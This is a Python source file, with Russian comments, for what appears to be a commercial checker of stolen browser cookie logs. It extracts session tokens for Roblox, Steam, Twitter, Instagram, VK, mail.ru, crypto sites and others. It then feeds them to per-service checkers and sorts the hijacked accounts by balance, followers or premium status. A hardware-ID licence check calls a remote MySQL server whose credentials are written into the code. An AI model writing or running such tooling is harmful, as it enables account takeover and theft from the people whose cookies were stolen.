# -*- coding: utf-8 -*-
import threading
import time

import pymysql
import datetime
import uuid
import hashlib
from wmi import WMI
from crex24 import *
from freebitco import *
from humblebundle import *
from instagram import *
from kryptex import *
from mail import *
from pornohub import *
from roblox import *
from steam import *
from twitter import *
from vk import *
from tiktok import *
class StandartMetod(object):
    @staticmethod
    def validate(nick):
        nick.replace('\\', '').replace('/', '').replace('?', '').replace('<', '').replace('>', '').replace('|','')
        return nick

    @staticmethod
    def get_headers():
        '''Создает стандартные заголовки для запроса'''

        return {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0'}

    @staticmethod
    def get_all_cook_file(path):
        '''Ковертирует файлы logi(который нахоидтся рядом с активатором)'''

        return NetscapeToJson.get_full_json(path)


    @staticmethod
    def create_file_all_list(path):
        with open(path + "\\Full_valid.txt", 'w', encoding='utf-8') as file:
            pass

    @staticmethod
    def get_count_search(path):
        all_cook, file = StandartMetod.get_all_cook_file(path)
        allow_services = headless.get_settings()['Services']
        data_services = headless.settings_services
        bag = []
        resoult_scan = {}
        for key,value in data_services.items():
            count = 0
            if allow_services[key]:
                for id in range(len(all_cook)):
                    for cook in all_cook[id]:
                        if cook['domain'] in value['domain']:
                            if cook['name'] in value['name']:
                                if cook['value'] not in bag:
                                    count += 1
                                    resoult_scan[key] = count
                                    bag.append(cook['value'])
                if count == False:
                    resoult_scan[key] = 0
        return resoult_scan


class NetscapeToJson(object):
    @staticmethod
    def convertor(path) -> list:
        '''' Обрабатывает файл по path -
        Переводит куки netscape в json
        :path - путь к файлу'''
        cookies = []
        with open(path, 'r', encoding='utf-8') as file:
            src = file.readlines()
            cookies = [{'domain': i.strip().split('\t')[0], 'name': i.strip().split('\t')[5], 'path': i.strip().split('\t')[2], 'value': i.strip().split('\t')[6]} for i in src if len(i.strip().split('\t')) > 6]
        return cookies
    @staticmethod
    def get_full_json(dict='data'):
        '''' Обрабатывает все логи в dict-
        Переводит куки netscape в json
        :dict - путь к файлу с логами'''
        files = os.listdir(dict)
        logi = list(filter(lambda x: x.endswith('.txt'), files))
        return [NetscapeToJson.convertor(f"{dict}\\" + i) for i in logi], logi


class connetcion_database(object):
    def __init__(self, hwid, hwidhash):
        self.hwid = hwid
        self.hwidhash = hwidhash
        self.database = 'User'

    @staticmethod
    def create_default_table():
        connection = pymysql.connect(
            host="f0551540.xsph.ru",
            port=3306,
            user="f0551540_Butterfly",
            password="aOJbVIzU",
            database="f0551540_Butterfly",
            cursorclass=pymysql.cursors.DictCursor
        )
        with connection.cursor() as cursor:
            create_table_query = f"CREATE TABLE `User`(id int AUTO_INCREMENT," \
                                 " HWID varchar(128), hwidhash varchar(228), date varchar(48), blocked varchar(12), activation varchar(12), PRIMARY KEY (id));"
            cursor.execute(create_table_query)
        connection.close()

    def connetcion(self):
        connection = pymysql.connect(
            host="f0551540.xsph.ru",
            port=3306,
            user="f0551540_Butterfly",
            password="aOJbVIzU",
            database="f0551540_Butterfly",
            cursorclass=pymysql.cursors.DictCursor
        )
        return connection

    def register(self):
        connection = self.connetcion()
        with connection.cursor() as cursor:
            first_Date = datetime.datetime.now()
            license_date = first_Date + datetime.timedelta(days=31)
            cursor.execute(f"INSERT INTO `{self.database}` (HWID,hwidhash,date,blocked,activation) VALUES ('" + self.hwid + "', '" + self.hwidhash + "','" + str(license_date) + "','False','False');")
            connection.commit()

    def get_register(self):
        connection = self.connetcion()
        with connection.cursor() as cursor:
            cursor.execute(f"SELECT HWID FROM `{self.database}` where HWID = %s", [self.hwid])
            if cursor.rowcount:
                cursor.execute(f"SELECT hwidhash FROM `{self.database}` where hwidhash = %s", [self.hwidhash])
                if cursor.rowcount:
                    return True
                else:
                    self.register()
                    return False
            else:
                self.register()
                return False

    def get_success(self):
        connection = self.connetcion()
        with connection.cursor() as cursor:
            cursor.execute(f"SELECT hwidhash FROM {self.database} where hwidhash = %s", [self.hwidhash])
            if cursor.rowcount:
                cursor.execute(f"SELECT blocked,activation,date FROM {self.database} where hwidhash = %s", [self.hwidhash])
                data = cursor.fetchone()
                if data['blocked'] == 'False' and data['activation'] == 'True':
                    first_Date = datetime.datetime.now()
                    date_user = (datetime.datetime.strptime(data['date'], "%Y-%m-%d %H:%M:%S.%f") - first_Date).days
                    if (int(date_user) < 0):
                        return False
                    else:
                        return True
                else:
                    return False
            else:
                return False

    def get_full_data(self):
        connection = self.connetcion()
        with connection.cursor() as cursor:
            cursor.execute(f"SELECT * FROM {self.database} where hwidhash = %s", [self.hwidhash])
            return cursor.fetchone()

class headless(object):
    services = ['Crex24', 'FreeBitco', 'HumbleBundle', 'Instagram', 'Kryptex', 'Mail', 'PornoHub', 'Roblox', 'Steam', 'Twitter', 'Vk', 'TikTok']
    settings_services = {
        'Crex24': {'domain': ['crex24.com', '.crex24.com','www.crex24.com'], 'name': ['connect.sid']},
        'FreeBitco': {'domain': ['freebitco.in', '.freebitco.in','www.freebitco.in'], 'name': ['fbtc_session','fbtc_userid']},
        'HumbleBundle': {'domain': ['.humblebundle.com', 'www.humblebundle.com', 'humblebundle.com'], 'name': ['_simpleauth_sess']},
        'Instagram': {'domain': ['.instagram.com', 'instagram.com', 'www.instagram.com'], 'name': ['sessionid']},
        'Kryptex': {'domain': ['.kryptex.org', 'www.kryptex.org', 'kryptex.org'], 'name': ['sessionid']},
        'Mail': {'domain': ['.e.mail.ru','.calls.mail.ru','.mail.ru', 'mail.ru', 'cloud.mail.ru', 'mail.google.com', '.account.mail.ru','account.mail.ru'], 'name': ['Mpop','sdcs']},
        'PornoHub': {'domain': ['.pornhub.org', 'pornhub.org', 'www.pornhub.com'], 'name': ['il']},
        'Roblox': {'domain': ['.roblox.com', 'www.roblox.com'], 'name': ['.ROBLOSECURITY']},
        'Steam': {'domain': ['store.steampowered.com', '.steampowered.com', 'help.steampowered.com', 'steampowered.com', '.steamcommunity.com', 'steamcommunity.com'], 'name': ['steamLoginSecure']},
        'Twitter': {'domain': ['.twitter.com', 'twitter.com'], 'name': ['auth_token']},
        'Vk': {'domain': ['.vk.com','vk.com'], 'name': ['remixnsid', 'remixsid']},
        'TikTok': {'domain': ['.www.tiktok.com', '.tiktok.com', 'tiktok.com'], 'name': ['sessionid']}
    }


    @staticmethod
    def get_hwid_hash() -> str:
        hwid = str(uuid.uuid1(uuid.getnode(), 0))[24:]
        hwid_hash = hashlib.sha256(hwid.encode('utf-8'))
        return hwid_hash.hexdigest()

    @staticmethod
    def get_hwid() -> str:
        HWID = WMI().Win32_ComputerSystemProduct()[0].UUID
        return HWID

    @staticmethod
    def create_default_file():
        try:
            os.mkdir('data')
        except:
            pass
        for servis in headless.services:
            try:
                os.mkdir(servis)
            except:
                pass
        settings = {'File_scan':'data',
                    'Random_user_agent': 0,
                    'Flow_count': 600,
                    'Services':{
                        'Crex24': 1,
                        'FreeBitco': 1,
                        'HumbleBundle': 1,
                        'Instagram': 1,
                        'Kryptex': 1,
                        'Mail': 1,
                        'PornoHub': 1,
                        'Roblox': 1,
                        'Steam': 1,
                        'Twitter': 1,
                        'Vk': 1,
                        'TikTok': 1,
                    },
                    'Filter_settings': {
                        'Crex24': {
                            'Full_log': "!Full_log",
                            'Balanc_path': '!Balanc',
                            'Filter_balanc': '0.00030'
                        },
                        'FreeBitco': {
                            'Full_log': '!Full_log',
                            'Balanc_path': '!Balanc',
                            'Filter_balanc': '0.00030'
                        },
                        'Humblebundle': {
                            'Full_log': '!Full_log',
                            'Premium_path': '!Premium',
                            'Filter_premium': 'True'
                        },
                        'Instagram': {
                            'Full_log': '!Full_log',
                            'Follower_path': '!Follower',
                            'Filter_follower': '700',
                            'Publications_path': '!Publications',
                            'Filter_publications': '100'
                        },
                        'Kryptex': {
                            'Full_log': '!Full_log',
                            'Balanc_path': '!Balanc',
                            'Filter_balanc': '0.00030'
                        },
                        'PornoHub': {
                            'Full_log': '!Full_log',
                            'Premium_path': '!Premium',
                            'Filter_premium': 'True'
                        },
                        'Roblox': {
                            'Full_log': '!Full_log',
                            'Robux_path': '!Robux',
                            'Filter_robux': '40',
                            'Followers_path': '!Followers',
                            'Filter_followers': '100'
                        },
                        'Twitter': {
                            'Full_log': '!Full_log',
                            'Followers_path': '!Followers',
                            'Filter_followers': '100',
                            'Verified_path': '!Verified',
                            'Filter_verified': 'True'
                        },
                        'Vk': {
                            'Full_log': '!Full_log',
                            'Balanc_path': '!Balanc',
                            'Filter_balanc': '10',
                            'Friends_path': '!Friends',
                            'Filter_friends': '50'
                        },
                        'TikTok': {
                            'Full_log': '!Full_log',
                            'Followers_path': '!Followers',
                            'Filter_followers': '200'
                        }
                    }
                    }
        try:
            with open('settings.json', 'r') as file:
                pass
        except:
            with open(f'settings.json', 'w', encoding='utf-8') as outfile:
                json.dump(settings, outfile, indent=4, ensure_ascii=False)

    @staticmethod
    def get_settings():
        with open(f'settings.json', 'r', encoding='utf-8') as outfile:
            return json.load(outfile)

class start_work():
    headless.create_default_file()
    settings_services = headless.settings_services
    settings = headless.get_settings()
    allow_services = settings['Services']

    files = os.listdir(settings['File_scan'])
    full_logi = list(filter(lambda x: x.endswith('.txt'), files))
    log_loker = threading.RLock()
    @staticmethod
    def get_cookie(path, domain, name):
        return_list = []
        with open(path, 'r', encoding='utf-8') as file:
            src = file.readlines()
        local_dict = {}
        for line in src:
            local_line = line.strip().split('\t')
            if local_line[0] in domain:
                if local_line[-2] in name:
                    local_dict[local_line[-2]] = local_line[-1]
            if len(local_dict) == len(name):
                return_list.append(local_dict)
                local_dict = {}
        return return_list
    @staticmethod
    def get_full_cookie(path):
        roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie = [], [], [], [], [], [], []
        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = [], [], [], [], []
        with open(path,'r', encoding='utf-8') as file:
            src = file.readlines()
        local_roblox, local_twitter, local_humbleBundle, local_instagram, local_kryptex, local_mail, local_pornohub = {}, {}, {}, {}, {}, {}, {}
        local_steam, local_vk, local_crex24, local_freebitco, local_tiktok = {}, {}, {}, {}, {}
        for line in src:
            local_line = line.strip().split('\t')
            if start_work.allow_services['Roblox']:
                if local_line[0] in start_work.settings_services['Roblox']['domain']:
                    if local_line[-2] in start_work.settings_services['Roblox']['name']:
                        local_roblox[local_line[-2]] = local_line[-1]
            if len(local_roblox) == len(start_work.settings_services['Roblox']['name']):
                roblox_cookie.append(local_roblox)
                local_roblox = {}

            if start_work.allow_services['Twitter']:
                if local_line[0] in start_work.settings_services['Twitter']['domain']:
                    if local_line[-2] in start_work.settings_services['Twitter']['name']:
                        local_twitter[local_line[-2]] = local_line[-1]
            if len(local_twitter) == len(start_work.settings_services['Twitter']['name']):
                twitter_cookie.append(local_twitter)
                local_twitter = {}

            if start_work.allow_services['HumbleBundle']:
                if local_line[0] in start_work.settings_services['HumbleBundle']['domain']:
                    if local_line[-2] in start_work.settings_services['HumbleBundle']['name']:
                        local_humbleBundle[local_line[-2]] = local_line[-1]
            if len(local_humbleBundle) == len(start_work.settings_services['HumbleBundle']['name']):
                humbleBundle_cookie.append(local_humbleBundle)
                local_humbleBundle = {}

            if start_work.allow_services['Instagram']:
                if local_line[0] in start_work.settings_services['Instagram']['domain']:
                    if local_line[-2] in start_work.settings_services['Instagram']['name']:
                        local_instagram[local_line[-2]] = local_line[-1]
            if len(local_instagram) == len(start_work.settings_services['Instagram']['name']):
                instagram_cookie.append(local_instagram)
                local_instagram = {}

            if start_work.allow_services['Kryptex']:
                if local_line[0] in start_work.settings_services['Kryptex']['domain']:
                    if local_line[-2] in start_work.settings_services['Kryptex']['name']:
                        local_kryptex[local_line[-2]] = local_line[-1]
            if len(local_kryptex) == len(start_work.settings_services['Kryptex']['name']):
                kryptex_cookie.append(local_kryptex)
                local_kryptex = {}

            if start_work.allow_services['Mail']:
                if local_line[0] in start_work.settings_services['Mail']['domain']:
                    if local_line[-2] in start_work.settings_services['Mail']['name']:
                        local_mail[local_line[-2]] = local_line[-1]
            if len(local_mail) == len(start_work.settings_services['Mail']['name']):
                mail_cookie.append(local_mail)
                local_mail = {}

            if start_work.allow_services['PornoHub']:
                if local_line[0] in start_work.settings_services['PornoHub']['domain']:
                    if local_line[-2] in start_work.settings_services['PornoHub']['name']:
                        local_pornohub[local_line[-2]] = local_line[-1]
            if len(local_pornohub) == len(start_work.settings_services['PornoHub']['name']):
                pornohub_cookie.append(local_pornohub)
                local_pornohub = {}

            if start_work.allow_services['Steam']:
                if local_line[0] in start_work.settings_services['Steam']['domain']:
                    if local_line[-2] in start_work.settings_services['Steam']['name']:
                        local_steam[local_line[-2]] = local_line[-1]
            if len(local_steam) == len(start_work.settings_services['Steam']['name']):
                steam_cookie.append(local_steam)
                local_steam = {}

            if start_work.allow_services['Vk']:
                if local_line[0] in start_work.settings_services['Vk']['domain']:
                    if local_line[-2] in start_work.settings_services['Vk']['name']:
                        local_vk[local_line[-2]] = local_line[-1]
            if len(local_vk) == len(start_work.settings_services['Vk']['name']):
                vk_cookie.append(local_vk)
                local_vk = {}

            if start_work.allow_services['Crex24']:
                if local_line[0] in start_work.settings_services['Crex24']['domain']:
                    if local_line[-2] in start_work.settings_services['Crex24']['name']:
                        local_crex24[local_line[-2]] = local_line[-1]
            if len(local_crex24) == len(start_work.settings_services['Crex24']['name']):
                crex24_cookie.append(local_crex24)
                local_crex24 = {}

            if start_work.allow_services['FreeBitco']:
                if local_line[0] in start_work.settings_services['FreeBitco']['domain']:
                    if local_line[-2] in start_work.settings_services['FreeBitco']['name']:
                        local_freebitco[local_line[-2]] = local_line[-1]
            if len(local_freebitco) == len(start_work.settings_services['FreeBitco']['name']):
                freebitco_cookie.append(local_freebitco)
                local_freebitco = {}

            if start_work.allow_services['TikTok']:
                if local_line[0] in start_work.settings_services['TikTok']['domain']:
                    if local_line[-2] in start_work.settings_services['TikTok']['name']:
                        local_tiktok[local_line[-2]] = local_line[-1]
            if len(local_tiktok) == len(start_work.settings_services['TikTok']['name']):
                tiktok_cookie.append(local_tiktok)
                local_tiktok = {}
        return roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie
    @classmethod
    def start(cls):
        changer_log = True
        stop = 0
        counter_stop = 0
        for key,value in dict(cls.allow_services).items():
            if value:
                stop += 1
        roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie = {}, {}, {}, {}, {}, {}, {}
        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = {}, {}, {}, {}, {}
        while True:
            if changer_log:
                if cls.full_logi:
                    with cls.log_loker:
                        log = random.choice(cls.full_logi)
                        cls.full_logi.remove(log)
                        changer_log = False
                    roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie\
                    , pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = start_work.get_full_cookie(path=cls.settings['File_scan']+"\\"+log)
                else:
                    break



            if cls.allow_services['Roblox']:
                if roblox_cookie:
                    roblox_cook = random.choice(roblox_cookie)
                    roblox_cookie.remove(roblox_cook)
                    roblox_checker.checker('Roblox', roblox_cook, log, cls.settings['File_scan'])
                if len(roblox_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Twitter']:
                if twitter_cookie:
                    twitter_cook = random.choice(twitter_cookie)
                    twitter_cookie.remove(twitter_cook)
                    twitter_checker.checker('Twitter', twitter_cook, log, cls.settings['File_scan'])
                if len(twitter_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['HumbleBundle']:
                if humbleBundle_cookie:
                    humbleBundle_cook = random.choice(humbleBundle_cookie)
                    humbleBundle_cookie.remove(humbleBundle_cook)
                    humblebundle_checker.checker('HumbleBundle', humbleBundle_cook, log, cls.settings['File_scan'])
                if len(humbleBundle_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Instagram']:
                if instagram_cookie:
                    instagram_cook = random.choice(instagram_cookie)
                    instagram_cookie.remove(instagram_cook)
                    instagram_checker.checker('Instagram', instagram_cook, log, cls.settings['File_scan'])
                if len(instagram_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Kryptex']:
                if kryptex_cookie:
                    kryptex_cook = random.choice(kryptex_cookie)
                    kryptex_cookie.remove(kryptex_cook)
                    kryptex_checker.checker('Kryptex', kryptex_cook, log, cls.settings['File_scan'])
                if len(kryptex_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Mail']:
                if mail_cookie:
                    mail_cook = random.choice(mail_cookie)
                    mail_cookie.remove(mail_cook)
                    mail_ru_checker.checker('Mail', mail_cook, log)
                    counter_stop += 1

            if cls.allow_services['PornoHub']:
                if pornohub_cookie:
                    pornohub_cook = random.choice(pornohub_cookie)
                    pornohub_cookie.remove(pornohub_cook)
                    pornohub_checker.checker('PornoHub', pornohub_cook, log, cls.settings['File_scan'])
                if len(pornohub_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Steam']:
                if steam_cookie:
                    steam_cook = random.choice(steam_cookie)
                    steam_cookie.remove(steam_cook)
                    steam_checker.checker('Steam', steam_cook, log)
                if len(steam_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Vk']:
                if vk_cookie:
                    vk_cook = random.choice(vk_cookie)
                    vk_cookie.remove(vk_cook)
                    vk_checker.checker('Vk', vk_cook, log, cls.settings['File_scan'])
                if len(vk_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['Crex24']:
                if crex24_cookie:
                    crex24_cook = random.choice(crex24_cookie)
                    crex24_cookie.remove(crex24_cook)
                    crex24_checker.checker('Crex24', crex24_cook, log, cls.settings['File_scan'])
                if len(crex24_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['FreeBitco']:
                if freebitco_cookie:
                    freebitco_cook = random.choice(freebitco_cookie)
                    freebitco_cookie.remove(freebitco_cook)
                    freebitco_checker.checker('FreeBitco', freebitco_cook, log, cls.settings['File_scan'])
                if len(freebitco_cookie) == 0:
                    counter_stop += 1

            if cls.allow_services['TikTok']:
                if tiktok_cookie:
                    tiktok_cook = random.choice(tiktok_cookie)
                    tiktok_cookie.remove(tiktok_cook)
                    tiktok_checker.checker('TikTok', tiktok_cook, log, cls.settings['File_scan'])
                if len(tiktok_cookie) == 0:
                    counter_stop += 1

            if counter_stop >= stop:
                changer_log = True

            time.sleep(1)

if __name__ == '__main__':
    pass
    # files = os.listdir('data')
    # full_logi = list(filter(lambda x: x.endswith('.txt'), files))
    # for i in full_logi:
    #     print(start_work.get_full_cookie(f'data\\{i}'))
    #     time.sleep(1)